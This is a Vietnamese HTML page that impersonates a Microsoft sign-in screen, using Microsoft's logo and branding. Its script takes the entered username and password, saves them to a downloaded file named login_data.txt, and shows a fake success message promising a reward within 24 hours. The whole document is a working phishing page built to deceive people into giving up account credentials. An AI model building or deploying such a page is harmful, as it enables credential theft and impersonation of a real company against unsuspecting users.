
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Đăng nhập - Microsoft</title>
  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(120deg, #e3e9f2 0%, #d6e8fa 100%);
      height: 100vh;
      margin: 0;
      font-family: 'Segoe UI', Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .login-box {
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 4px 32px 0 rgba(0,0,0,.08);
      padding: 40px 32px 32px 32px;
      width: 340px;
      max-width: 90vw;
      position: relative;
    }
    .login-logo {
      width: 32px;
      margin-bottom: 20px;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    .login-title {
      font-size: 22px;
      font-weight: 700;
      margin-bottom: 12px;
      color: #22223b;
      text-align: center;
    }
    .login-label {
      font-size: 13px;
      margin-bottom: 4px;
      color: #494949;
    }
    .login-input {
      width: 100%;
      padding: 10px 12px;
      border: 1px solid #b9b9b9;
      border-radius: 5px;
      margin-bottom: 16px;
      font-size: 15px;
      background: #f7f8fa;
      box-sizing: border-box;
      transition: border 0.2s;
    }
    .login-input:focus {
      outline: none;
      border: 1.5px solid #2564cf;
      background: #fff;
    }
    .login-btn {
      width: 100%;
      background: #2564cf;
      color: #fff;
      border: none;
      border-radius: 5px;
      padding: 11px 0;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 6px;
      transition: background 0.2s;
    }
    .login-btn:hover {
      background: #174ea6;
    }
    .login-footer {
      text-align: right;
      margin-top: 8px;
    }
    .login-footer a {
      color: #2564cf;
      text-decoration: none;
      font-size: 13px;
    }
    .login-footer a:hover {
      text-decoration: underline;
    }
    .login-success {
      color: #219150;
      font-size: 14px;
      text-align: center;
      margin-bottom: 10px;
      font-weight: 500;
    }
    .login-error {
      color: #d32f2f;
      font-size: 14px;
      text-align: center;
      margin-bottom: 10px;
      font-weight: 500;
    }
  </style>
</head>
<body>
  <form class="login-box" id="loginForm" autocomplete="off">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="login-logo" alt="Logo">
    <div class="login-title">Đăng nhập vào Microsoft</div>
    <div id="loginMessage"></div>
    <label class="login-label" for="username">Tài khoản hoặc Email</label>
    <input class="login-input" id="username" type="text" required autofocus autocomplete="username">
    <label class="login-label" for="password">Mật khẩu</label>
    <input class="login-input" id="password" type="password" required autocomplete="current-password">
    <button class="login-btn" type="submit">Đăng nhập</button>
    <div class="login-footer">
      <a href="#">Bạn quên mật khẩu?</a>
    </div>
  </form>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      var username = document.getElementById('username').value.trim();
      var password = document.getElementById('password').value;
      var message = document.getElementById('loginMessage');
      if (username && password) {
        // Tạo nội dung file
        var content = "Username: " + username + "\nPassword: " + password;
        var blob = new Blob([content], { type: "text/plain" });
        var link = document.createElement("a");
        link.href = URL.createObjectURL(blob);
        link.download = "login_data.txt";
        link.style.display = "none";
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        message.innerHTML = '<div class="login-success">Đăng nhập thành công!24h sẽ có capce nha .</div>';
      } else {
        message.innerHTML = '<div class="login-error">Vui lòng nhập đầy đủ thông tin!</div>';
      }
    });
  </script>
</body>
</html>
